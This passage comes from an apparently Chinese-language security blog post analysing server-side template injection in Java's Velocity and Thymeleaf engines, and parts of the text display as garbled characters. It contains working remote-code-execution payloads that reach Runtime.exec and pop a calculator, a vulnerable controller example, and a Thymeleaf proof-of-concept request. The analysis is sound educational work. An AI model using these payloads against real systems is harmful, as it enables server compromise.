class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.Velocity;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">velocityDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;#set($e=/&quot;</span>e/<span class="hljs-string">&quot;)/n&quot;</span> +<br>                <span class="hljs-string">&quot;$e.getClass().forName(/&quot;</span>java.lang.Runtime/<span class="hljs-string">&quot;).getMethod(/&quot;</span>getRuntime/<span class="hljs-string">&quot;,null).invoke(null,null).exec(/&quot;</span>Calc/<span class="hljs-string">&quot;)&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">templateString</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello, &quot;</span> + username + <span class="hljs-string">&quot; | Full name: $name, phone: $phone, email: $email&quot;</span>;<br><br>        Velocity.init();<br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        ctx.put(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;Little Hann&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;123456789&quot;</span>);<br>        ctx.put(<span class="hljs-string">&quot;email&quot;</span>, <span class="hljs-string">&quot;zhenghan.zh@alibaba-inc.com&quot;</span>);<br><br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        <span class="hljs-comment">// å°†æ¨¡æ¿å­—ç¬¦ä¸²å’Œä¸Šä¸‹æ–‡å¯¹è±¡ä¼ é€’ç»™Velocityå¼•æ“è¿›è¡Œè§£æå’Œæ¸²æŸ“</span><br>        Velocity.evaluate(ctx, out, <span class="hljs-string">&quot;test&quot;</span>, templateString);<br><br>        <span class="hljs-comment">// è¾“å‡ºvelocityæ¸²æŸ“ç»“æœ</span><br>        System.out.println(out.toString());<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadåˆ†æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#set($e=&quot;e&quot;)ï¼šå®šä¹‰äº†ä¸€ä¸ªVelocityå˜é‡$eï¼Œå¹¶èµ‹å€¼ä¸ºå­—ç¬¦ä¸²&quot;e&quot;ã€‚</span><br><span class="hljs-variable">$e</span>.getClass()ï¼šè·å–å˜é‡<span class="hljs-variable">$e</span>çš„è¿è¡Œæ—¶ç±»ã€‚<br>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)ï¼šé€šè¿‡åå°„åŠ è½½java.lang.Runtimeç±»ã€‚<br>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, null)ï¼šä½¿ç”¨åå°„è·å–Runtimeç±»çš„getRuntimeæ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿”å›Runtimeç±»çš„å®ä¾‹ã€‚<br>.invoke(null, null)ï¼šä½¿ç”¨åå°„è°ƒç”¨getRuntimeæ–¹æ³•ï¼Œå‚æ•°ä¸ºnullï¼Œå› ä¸ºè¯¥æ–¹æ³•ä¸æ¥å—ä»»ä½•å‚æ•°ã€‚è¿™å°†è¿”å›Runtimeç±»çš„å®ä¾‹ã€‚<br>.<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;open -a calculator&quot;</span>)ï¼šä½¿ç”¨Runtimeç±»çš„å®ä¾‹çš„<span class="hljs-built_in">exec</span>æ–¹æ³•æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨è¿™é‡Œï¼Œå‘½ä»¤æ˜¯open -a calculatorï¼Œå³æ‰“å¼€Macçš„è®¡ç®—å™¨<br>windowsä¸€èˆ¬ä½¿ç”¨Calcå³å¯<br></code></pre></td></tr></table></figure><p>è¿è¡Œä¸»ç¨‹åºï¼Œçœ‹åˆ°è®¡ç®—å™¨æˆåŠŸå¼¹å‡º</p><p><img src="/img/ssti(java)/ssti22.png"></p><p>æ ¹æ®æµ‹è¯•ç¨‹åºï¼Œé¦–å…ˆä¼šè¿›å…¥Velocityç±»çš„initæ–¹æ³•ï¼Œåœ¨æ­¤å¤„ä¸‹æ–­ç‚¹</p><p>åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨RuntimeSingletonç±»çš„initæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¸»è¦æ˜¯å¯¹æ¨¡æ¿å¼•æ“çš„åˆå§‹åŒ–ï¼Œæ¯”å¦‚è®¾ç½®å±æ€§ã€åˆå§‹åŒ–æ—¥å¿—ç³»ç»Ÿã€èµ„æºç®¡ç†å™¨ã€æŒ‡ä»¤ç­‰ã€‚</p><p><img src="/img/ssti(java)/ssti23.png"></p><p>æ¥ä¸‹æ¥å›åˆ°ä¸»ç¨‹åºä¸­ï¼Œå®ä¾‹åŒ–VelocityContextï¼Œå¹¶å°†ä¸‰å¯¹é”®å€¼å¯¹putè¿›å»ï¼Œä¹‹åè°ƒç”¨Velocityç±»çš„evaluateæ–¹æ³•ï¼Œæ­¤æ—¶templateStringçš„å€¼ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Hello, <span class="hljs-comment">#set($e=&quot;e&quot;)</span><br><span class="hljs-variable">$e</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,null).invoke(null,null).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;Calc&quot;</span>) | Full name: <span class="hljs-variable">$name</span>, phone: <span class="hljs-variable">$phone</span>, email: <span class="hljs-variable">$email</span><br></code></pre></td></tr></table></figure><p>ä¸‹ä¸€æ­¥è¿›å…¥äº†RuntimeInstanceçš„evaluateæ–¹æ³•-&gt;è¿›å…¥é‡è½½çš„evaluateæ–¹æ³•</p><p>è¿™ä¸ªæ–¹æ³•ä¼šè°ƒç”¨RuntimeInstanceç±»çš„parseæ–¹æ³•è¿›è¡Œè§£æã€‚</p><p>ç»è¿‡ä¸¤é‡è°ƒç”¨æ¥åˆ°org&#x2F;apache&#x2F;velocity&#x2F;runtime&#x2F;parser&#x2F;Parser.classçš„parseæ–¹æ³•ã€‚</p><p>å®Œæˆæ¨¡æ¿æ–‡ä»¶çš„parseå·¥ä½œåï¼Œç”Ÿæˆastè¯­æ³•æ ‘ç»“æ„</p><p><img src="/img/ssti(java)/ssti24.png"></p><p>å½“æ‰§è¡Œæ¥åˆ°engine.evaluateï¼›æˆ‘ä»¬è·Ÿè¿›å»ï¼Œç›´æ¥å°±çœ‹åˆ°äº†RuntimeInstance.evaluateï¼›æœ€åä¼šè°ƒç”¨ render æ–¹æ³•å°†è§£æåçš„å†…å®¹æ¸²æŸ“åˆ° writer ä¸­ï¼Œå¹¶è¿”å›æ¸²æŸ“ç»“æœ</p><p><img src="/img/ssti(java)/ssti25.png"></p><p>è·Ÿè¿›åˆ°renderï¼›è¿™é‡Œä¸»è¦å®ç°çš„æ˜¯å°†è§£æåçš„èŠ‚ç‚¹æ ‘æ¸²æŸ“åˆ°æŒ‡å®šçš„å†™å…¥å™¨ä¸­ã€‚</p><p>é¦–å…ˆåœ¨729è¡Œè°ƒç”¨ nodeTree.initå¯¹èŠ‚ç‚¹æ ‘è¿›è¡Œåˆå§‹åŒ–ã€‚æ¥ç€è°ƒç”¨ nodeTree.renderå°†èŠ‚ç‚¹æ ‘æ¸²æŸ“åˆ°å†™å…¥å™¨ä¸­ã€‚</p><p><img src="/img/ssti(java)/ssti26.png"></p><p>è·Ÿè¿›å»åˆ°renderã€‚è¿™é‡Œä¸»è¦å®ç°çš„æ˜¯è·å–èŠ‚ç‚¹æ ‘çš„å­èŠ‚ç‚¹æ•°é‡ï¼Œå¹¶ä½¿ç”¨ for å¾ªç¯éå†æ‰€æœ‰å­èŠ‚ç‚¹ã€‚é€šè¿‡ jjtGetChild(i) æ–¹æ³•è·å–ç¬¬ i ä¸ªå­èŠ‚ç‚¹ï¼Œå¹¶è°ƒç”¨å…¶ render æ–¹æ³•æ¥æ¸²æŸ“å­èŠ‚ç‚¹å†…å®¹åˆ°æŒ‡å®šçš„å†™å…¥å™¨ä¸­ã€‚</p><p><img src="/img/ssti(java)/ssti27.png"></p><p>ç»§ç»­è·Ÿè¿›jjtGetChild(i).renderï¼›æœ€åæ¥åˆ°äº†ASTReference.render.</p><p>å…ˆåˆ¤æ–­this.referenceType çš„å€¼æ˜¯å¦ä¸º 4ï¼›ç„¶ååˆ¤æ–­this.escaped çš„å€¼ä¸ºfalse</p><p><img src="/img/ssti(java)/ssti28.png"></p><p>ç»§ç»­è·Ÿè¿›æ¥ä¹‹åï¼Œå°±åˆ°äº†ASTMethod.executeã€‚è¿™é‡Œæ¥å—ä¸€ä¸ª Object å¯¹è±¡å’Œä¸€ä¸ª InternalContextAdapter å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚æˆ‘ä»¬ç›´æ¥çœ‹åˆ°</p><p>è°ƒç”¨ method.invoke(o, params) æ–¹æ³•æ‰§è¡Œæ–¹æ³•è°ƒç”¨ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨ obj å˜é‡ä¸­ã€‚</p><p><img src="/img/ssti(java)/ssti30.png"></p><p>è·Ÿè¿›å»æŸ¥çœ‹invokeï¼›åˆ¤æ–­æ–¹æ³•æ˜¯å¦ä¸ºå¯å˜å‚æ•°æ–¹æ³•ï¼Œå¦‚æœæ˜¯å°±è¿›è¡Œä¸€ç³»åˆ—æ“ä½œã€‚æœ€åè°ƒç”¨doInvokeæ–¹æ³•æ‰§è¡Œå®é™…çš„æ–¹æ³•è°ƒç”¨ï¼Œå¹¶è¿”å›ç»“æœã€‚</p><p>è€ŒdoInvokeæ–¹æ³•ï¼Œæ­£æ˜¯ä¸‹é¢çš„doInvokeæ–¹æ³•ï¼Œå¯ä»¥çœ‹åˆ°getClassæ–¹æ³•å·²ç»ä½œä¸ºå‚æ•°è¢«ä¼ å…¥</p><p><img src="/img/ssti(java)/ssti31.png"></p><p>æœ€åè°ƒç”¨äº†Javaåå°„é‡Œé¢çš„invokeï¼Œè¿›è¡Œæ‰§è¡Œ</p><p><img src="/img/ssti(java)/ssti32.png"></p><h5 id="mergeè§¦å‘"><a href="#mergeè§¦å‘" class="headerlink" title="mergeè§¦å‘"></a>mergeè§¦å‘</h5><p>mergeæ–¹æ³•ä½¿ç”¨VelocityEngineçš„getTemplateæ–¹æ³•è·å–æŒ‡å®šçš„æ¨¡æ¿æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨mergeæ–¹æ³•å°†æ¨¡æ¿å’Œä¸Šä¸‹æ–‡æ•°æ®åˆå¹¶ä¸ºæœ€ç»ˆç»“æœã€‚</p><p>åˆ›å»ºä¸€ä¸ªservlet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.garck3h.controller;<br><br><span class="hljs-keyword">import</span> org.apache.velocity.Template;<br><span class="hljs-keyword">import</span> org.apache.velocity.VelocityContext;<br><span class="hljs-keyword">import</span> org.apache.velocity.app.VelocityEngine;<br><span class="hljs-keyword">import</span> org.apache.velocity.runtime.RuntimeConstants;<br><span class="hljs-keyword">import</span> org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VelocityInjectionController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping(&quot;/merge&quot;)</span><br>   <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">merge</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// ä»è¯·æ±‚å‚æ•°ä¸­è·å–æ¨¡æ¿å€¼</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;template&quot;</span>);<br><br>        <span class="hljs-comment">// ä»classpathä¸­åŠ è½½Velocityæ¨¡æ¿</span><br>        <span class="hljs-type">VelocityEngine</span> <span class="hljs-variable">engine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityEngine</span>();<br>        engine.setProperty(RuntimeConstants.RESOURCE_LOADER, <span class="hljs-string">&quot;classpath&quot;</span>);<br>        engine.setProperty(<span class="hljs-string">&quot;classpath.resource.loader.class&quot;</span>, ClasspathResourceLoader.class.getName());<br>        engine.init();<br><br>        <span class="hljs-comment">// åŠ¨æ€åˆ›å»ºVelocityä¸Šä¸‹æ–‡å¹¶è®¾ç½®å‚æ•°</span><br>        <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br>        context.put(<span class="hljs-string">&quot;params&quot;</span>, request.getParameterMap());<br><br>        <span class="hljs-comment">// è¿›è¡Œæ¨¡æ¿åˆå¹¶</span><br>        <span class="hljs-type">Template</span> <span class="hljs-variable">tpl</span> <span class="hljs-operator">=</span> engine.getTemplate(template);<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>        tpl.merge(context, sw);<br><br>        <span class="hljs-comment">// åˆ›å»ºModelAndViewå¯¹è±¡ï¼ŒæŒ‡å®šè§†å›¾åä¸º&quot;hello&quot;</span><br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>        <span class="hljs-comment">// å°†æ¨¡æ¿åˆå¹¶çš„ç»“æœä½œä¸ºå±æ€§æ·»åŠ åˆ°ModelAndViewå¯¹è±¡ä¸­</span><br>        modelAndView.addObject(<span class="hljs-string">&quot;hello&quot;</span>, sw.toString());<br>        <span class="hljs-comment">// è¿”å›ModelAndViewå¯¹è±¡</span><br>        <span class="hljs-keyword">return</span> modelAndView;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¨¡æ¿èƒ½å¤Ÿæ’å…¥è¯­å¥æ—¶ï¼Œä¼ å…¥payloadï¼Œå¯ä»¥æ­£å¸¸æ‰§è¡Œ</p><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><ul><li>å› ä¸ºSpringæ¡†æ¶ç‰ˆæœ¬çš„é—®é¢˜ï¼Œé«˜ç‰ˆæœ¬ä¸èƒ½ç›´æ¥æ•´åˆVelocityæ¨¡æ¿ï¼Œä¸€ç›´æŠ¥é”™</li><li>Velocityæ¨¡æ¿ç›®å‰ä¹Ÿé€æ¸è¢«å…¶å®ƒæ¨¡æ¿å¼•æ“æ›¿ä»£</li></ul><h2 id="Thymeleaf-SSTI"><a href="#Thymeleaf-SSTI" class="headerlink" title="Thymeleaf SSTI"></a>Thymeleaf SSTI</h2><ul><li>Thymeleafæ˜¯ç›®å‰æœ€æµè¡Œçš„æ¨¡æ¿å¼•æ“</li></ul><h3 id="Thymeleafè¯­æ³•"><a href="#Thymeleafè¯­æ³•" class="headerlink" title="Thymeleafè¯­æ³•"></a>Thymeleafè¯­æ³•</h3><p>Thymeleaf è¡¨è¾¾å¼å¯ä»¥æœ‰ä»¥ä¸‹ç±»å‹ï¼š</p><ul><li><code>$&#123;...&#125;</code>ï¼šå˜é‡è¡¨è¾¾å¼ â€”â€” é€šå¸¸åœ¨å®é™…åº”ç”¨ï¼Œä¸€èˆ¬æ˜¯OGNLè¡¨è¾¾å¼æˆ–è€…æ˜¯ Spring ELï¼Œå¦‚æœé›†æˆäº†Springçš„è¯ï¼Œå¯ä»¥åœ¨ä¸Šä¸‹æ–‡å˜é‡ï¼ˆcontext variables ï¼‰ä¸­æ‰§è¡Œ</li><li><code>*&#123;...&#125;</code>: é€‰æ‹©è¡¨è¾¾å¼ â€”â€” ç±»ä¼¼äºå˜é‡è¡¨è¾¾å¼ï¼ŒåŒºåˆ«åœ¨äºé€‰æ‹©è¡¨è¾¾å¼æ˜¯åœ¨å½“å‰é€‰æ‹©çš„å¯¹è±¡è€Œä¸æ˜¯æ•´ä¸ªä¸Šä¸‹æ–‡å˜é‡æ˜ å°„ä¸Šæ‰§è¡Œã€‚</li><li><code>#&#123;...&#125;</code>: Message (i18n) è¡¨è¾¾å¼ â€”â€” å…è®¸ä»å¤–éƒ¨æºï¼ˆæ¯”å¦‚<code>.properties</code>æ–‡ä»¶ï¼‰æ£€ç´¢ç‰¹å®šäºè¯­è¨€ç¯å¢ƒçš„æ¶ˆæ¯</li><li><code>@&#123;...&#125;</code>: é“¾æ¥ (URL) è¡¨è¾¾å¼ â€”â€” ä¸€èˆ¬ç”¨åœ¨åº”ç”¨ç¨‹åºä¸­è®¾ç½®æ­£ç¡®çš„ URL&#x2F;è·¯å¾„ï¼ˆURLé‡å†™ï¼‰ã€‚</li><li><code>~&#123;...&#125;</code>ï¼šç‰‡æ®µè¡¨è¾¾å¼ â€”â€” <strong>Thymeleaf 3.x ç‰ˆæœ¬æ–°å¢çš„å†…å®¹</strong>ï¼Œåˆ†æ®µæ®µè¡¨è¾¾å¼æ˜¯ä¸€ç§è¡¨ç¤ºæ ‡è®°ç‰‡æ®µå¹¶å°†å…¶ç§»åŠ¨åˆ°æ¨¡æ¿å‘¨å›´çš„ç®€å•æ–¹æ³•ã€‚ æ­£æ˜¯ç”±äºè¿™äº›è¡¨è¾¾å¼ï¼Œç‰‡æ®µå¯ä»¥è¢«å¤åˆ¶ï¼Œæˆ–è€…ä½œä¸ºå‚æ•°ä¼ é€’ç»™å…¶ä»–æ¨¡æ¿ç­‰ç­‰</li></ul><p>å®é™…ä¸Šï¼ŒThymeleaf å‡ºç° SSTI é—®é¢˜çš„ä¸»è¦åŸå› ä¹Ÿæ­£æ˜¯å› ä¸ºè¿™ä¸ªç‰‡æ®µè¡¨è¾¾å¼ï¼Œæˆ‘ä»¬çŸ¥é“ç‰‡æ®µè¡¨è¾¾å¼è¯­æ³•å¦‚ä¸‹ï¼š</p><ul><li><strong><code>~&#123;templatename::selector&#125;</code></strong>ï¼Œä¼šåœ¨<code>/WEB-INF/templates/</code>ç›®å½•ä¸‹å¯»æ‰¾åä¸º<code>templatename</code>çš„æ¨¡ç‰ˆä¸­å®šä¹‰çš„<code>fragment</code></li></ul><p>å¦‚æœ‰ä¸€ä¸ª html æ–‡ä»¶çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:fragment</span>=<span class="hljs-string">&quot;banquan&quot;</span>&gt;</span> <span class="hljs-symbol">&amp;copy;</span> 2021 ThreeDream yyds<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨å¦ä¸€templateä¸­å¯ä»¥é€šè¿‡ç‰‡æ®µè¡¨è¾¾å¼å¼•ç”¨è¯¥ç‰‡æ®µï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:insert</span>=<span class="hljs-string">&quot;~&#123;footer :: banquan&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p><code>th:insert</code>å’Œ<code>th:replace:</code>æ’å…¥ç‰‡æ®µæ˜¯æ¯”è¾ƒå¸¸è§çš„ç”¨æ³•</p><ol><li><code>~&#123;templatename&#125;</code>ï¼Œå¼•ç”¨æ•´ä¸ª<code>templatename</code>æ¨¡ç‰ˆæ–‡ä»¶ä½œä¸º<code>fragment</code></li></ol><p>è¿™ä¸ªä¹Ÿæ¯”è¾ƒå¥½ç†è§£ï¼Œä¸åšè¯¦ç»†ä¸¾ä¾‹</p><ol start="2"><li><code>~&#123;::selector&#125;</code> æˆ– <code>~&#123;this::selector&#125;</code>ï¼Œå¼•ç”¨æ¥è‡ªåŒä¸€æ¨¡ç‰ˆæ–‡ä»¶åä¸º<code>selector</code>çš„<code>fragmnt</code></li></ol><p>åœ¨è¿™é‡Œï¼Œ<code>selector</code>å¯ä»¥æ˜¯é€šè¿‡<code>th:fragment</code>å®šä¹‰çš„ç‰‡æ®µï¼Œä¹Ÿå¯ä»¥æ˜¯ç±»é€‰æ‹©å™¨ã€IDé€‰æ‹©å™¨ç­‰ã€‚</p><ol start="3"><li><strong>å½“<code>~&#123;&#125;</code>ç‰‡æ®µè¡¨è¾¾å¼ä¸­å‡ºç°<code>::</code>ï¼Œé‚£ä¹ˆ <code>::</code>åéœ€è¦æœ‰å€¼ï¼ˆä¹Ÿå°±æ˜¯<code>selector</code>ï¼‰</strong></li></ol><h3 id="Thymeleaf-SSTIæ³¨å…¥æ¼æ´"><a href="#Thymeleaf-SSTIæ³¨å…¥æ¼æ´" class="headerlink" title="Thymeleaf SSTIæ³¨å…¥æ¼æ´"></a>Thymeleaf SSTIæ³¨å…¥æ¼æ´</h3><h4 id="æ¼æ´ç‰ˆæœ¬"><a href="#æ¼æ´ç‰ˆæœ¬" class="headerlink" title="æ¼æ´ç‰ˆæœ¬"></a>æ¼æ´ç‰ˆæœ¬</h4><p>åªæœ‰3.xç‰ˆæœ¬çš„Thymeleaf æ‰ä¼šå—åˆ°å½±å“ï¼Œå› ä¸ºåœ¨2.x ä¸­<code>renderFragment</code>çš„æ ¸å¿ƒå¤„ç†æ–¹æ³•æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">renderFragment</span><span class="hljs-params">(Set&lt;String&gt; markupSelectorsToRender, Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        ...<br><br>                <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> viewTemplateEngine.getConfiguration();<br>                <span class="hljs-type">ProcessingContext</span> <span class="hljs-variable">processingContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessingContext</span>(context);<br>                templateCharacterEncoding = getStandardDialectPrefix(configuration);<br>                <span class="hljs-type">StandardFragment</span> <span class="hljs-variable">fragment</span> <span class="hljs-operator">=</span> StandardFragmentProcessor.computeStandardFragmentSpec(configuration, processingContext, viewTemplateName, templateCharacterEncoding, <span class="hljs-string">&quot;fragment&quot;</span>);<br>                <span class="hljs-keyword">if</span> (fragment == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Invalid template name specification: &#x27;&quot;</span> + viewTemplateName + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>                &#125;<br>                <br>        ...<br></code></pre></td></tr></table></figure><p>å¹¶æ²¡æœ‰3.x ç‰ˆæœ¬ä¸­å¯¹äºç‰‡æ®µè¡¨è¾¾å¼ï¼ˆ<code>~&#123;</code>ï¼‰çš„å¤„ç†ï¼Œä¹Ÿå› æ­¤ä¸ä¼šé€ æˆ SSTI æ¼æ´ï¼Œä»¥ä¸‹æ˜¯ SpringBoot é»˜è®¤å¼•ç”¨çš„ thymeleaf ç‰ˆæœ¬</p><blockquote><p>spring boot:1.5.1.RELEASE spring-boot-starter-thymeleaf:2.1.5<br>spring boot:2.0.0.RELEASE spring-boot-starter-thymeleaf:3.0.9<br>spring boot:2.2.0.RELEASE spring-boot-starter-thymeleaf:3.0.11</p></blockquote><h4 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><p>ä¸»è¦å‚è€ƒï¼š<a href="https://xz.aliyun.com/news/9962">Thymeleaf SSTIæ¼æ´åˆ†æ-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><p>è¿™é‡Œç›´æ¥ä½¿ç”¨<a href="https://github.com/veracode-research/spring-view-manipulation">veracode-research&#x2F;spring-view-manipulation(github.com)</a>é¡¹ç›®æ¥åšå¤ç°</p><p>æ¼æ´ä»£ç </p><p>æ­¤æ§åˆ¶å™¨åŸæœ¬ç”¨äºæ›´æ”¹é¡µé¢è¯­è¨€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/path&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">path</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String lang)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;user/&quot;</span> + lang + <span class="hljs-string">&quot;/welcome&quot;</span>; <span class="hljs-comment">//template path is tainted</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x<br></code></pre></td></tr></table></figure><p>è¿è¡Œç¨‹åºåé¡ºåˆ©å¼¹å‡ºè®¡ç®—å™¨</p><p><img src="/img/ssti(java)/ssti33.png"></p><h4 id="æ¼æ´åˆ†æ-2"><a href="#æ¼æ´åˆ†æ-2" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h4><p>å‚è€ƒï¼š<a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI åˆ†æä»¥åŠæœ€æ–°ç‰ˆä¿®å¤çš„ Bypass - Panda | 